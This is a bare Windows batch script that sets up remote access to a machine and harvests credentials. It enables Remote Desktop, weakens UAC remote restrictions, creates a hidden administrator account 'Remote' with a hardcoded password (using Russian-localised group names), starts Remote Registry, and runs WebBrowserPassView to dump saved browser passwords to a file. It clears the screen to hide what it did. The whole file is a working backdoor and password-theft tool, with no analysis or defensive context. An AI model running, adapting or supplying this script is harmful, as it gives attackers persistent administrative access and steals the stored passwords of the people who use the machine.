@echo off
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fClientDisableUDP /t REG_DWORD /d 1 /f
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v "LocalAccountTokenFilterPolicy" /t REG_DWORD /d 1 /f
powershell Set-ExecutionPolicy RemoteSigned
net user /add Remote admPass
net localgroup Администраторы Remote /add
net localgroup "Пользователи удаленного рабочего стола" Remote /add
sc \\%COMPUTERNAME% config remoteregistry start= auto
sc \\%COMPUTERNAME% start remoteregistry
start WebBrowserPassView.exe /stext pass.txt
cls
TIMEOUT 10
taskkill /IM "WebBrowserPassView.exe" /f
cls
exit